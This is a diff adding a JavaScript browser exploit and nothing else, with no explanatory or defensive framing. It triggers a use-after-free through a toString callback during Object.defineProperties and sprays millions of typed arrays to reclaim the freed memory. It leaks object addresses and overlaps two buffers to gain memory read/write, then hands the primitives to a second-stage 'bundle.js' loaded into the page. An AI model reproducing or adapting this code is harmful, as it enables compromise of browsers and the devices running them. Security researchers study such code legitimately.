@@ -1,0 +1,130 @@
+function minmain() {
+  var rwbuf = new ArrayBuffer(0x1003 * 4);
+  var tu = new Uint32Array(rwbuf);
+  for(var i = 0; i < tu.length; ++i)
+    tu[i] = 0x41424344;
+
+  var numbufs = 2000000;
+  var bufs = new Array(numbufs);
+
+  var first = true;
+  var arr = new Array(0x100);
+  var tbuf = new ArrayBuffer(0x1000);
+  arr[0] = tbuf;
+  arr[1] = 0x13371337;
+
+  var not_number = {};
+  not_number.toString = function() {
+    arr = null;
+    props["stale"]["value"] = null;
+
+    if(first) {
+      for(var i = 0; i < bufs.length; ++i)
+        bufs[i] = new Uint32Array(rwbuf);
+      first = false;
+    }
+
+    return 10;
+  };
+
+  var props = {
+    p0 : { value : 0 },
+    p1 : { value : 1 },
+    p2 : { value : 2 },
+    p3 : { value : 3 },
+    p4 : { value : 4 },
+    p5 : { value : 5 },
+    p6 : { value : 6 },
+    p7 : { value : 7 },
+    p8 : { value : 8 },
+    length : { value : not_number },
+    stale : { value : arr },
+    after : { value : 666 } 
+  };
+
+  var target = [];
+  var stale = 0;
+  var before_len = arr.length;
+  Object.defineProperties(target, props);
+  var stale = target.stale;
+
+  if(stale.length == before_len)
+    return loadRun(null);
+
+  if(stale.length < 2 || stale.length == 0x1003)
+    return loadRun(null);
+
+  var leakee = {'b' : null};
+  var leaker = {'a' : leakee};
+  stale[1] = leaker;
+
+  for(var i = 0; i < bufs.length; ++i)
+    if(bufs[i][0] != 0x41424344)
+      break;
+
+  if(i == bufs.length)
+    return loadRun(null);
+
+  var buf = bufs[i];
+
+  var leaklo = buf[4], leakhi = buf[5];
+  var temp = new Uint32Array(0x10);
+  stale[1] = temp;
+  var leakaddr = [leaklo, leakhi];
+
+  var restlo = buf[4];
+  var resthi = buf[5];
+  var restsize = buf[6];
+
+  var bstore = new ArrayBuffer(7 << 2);
+  var va = new Uint32Array(bstore);
+  var vb = new Uint32Array(bstore);
+
+  leakee['b'] = {'a' : va};
+  buf[4] = leakaddr[0];
+  buf[5] = leakaddr[1];
+  buf[6] = 6;
+  var lo = temp[4], hi = temp[5];
+  buf[4] = lo;
+  buf[5] = hi;
+  var addra = [temp[4], temp[5]];
+
+  leakee['b'] = {'a' : vb};
+  buf[4] = leakaddr[0];
+  buf[5] = leakaddr[1];
+  var lo = temp[4], hi = temp[5];
+  buf[4] = lo;
+  buf[5] = hi;
+  var addrb = [temp[4], temp[5]];
+
+  buf[4] = addra[0];
+  buf[5] = addra[1];
+  temp[4] = addrb[0];
+  temp[5] = addrb[1];
+
+  buf[4] = restlo;
+  buf[5] = resthi;
+  buf[6] = restsize;
+
+  tu = rwbuf = buf = bufs[i] = 0;
+  bufs = 0;
+
+  loadRun({
+    bstore: bstore, 
+    va: va, 
+    vb: vb, 
+    leakee: leakee, 
+    leakaddr: leakaddr
+  });
+}
+
+function loadRun(obj) {
+  window.exploitMe = obj;
+  var elem = document.createElement('script');
+  elem.setAttribute('src', 'bundle.js');
+  document.body.appendChild(elem);
+}
+
+setTimeout(function() {
+  document.getElementById('test').click();
+}, 100);
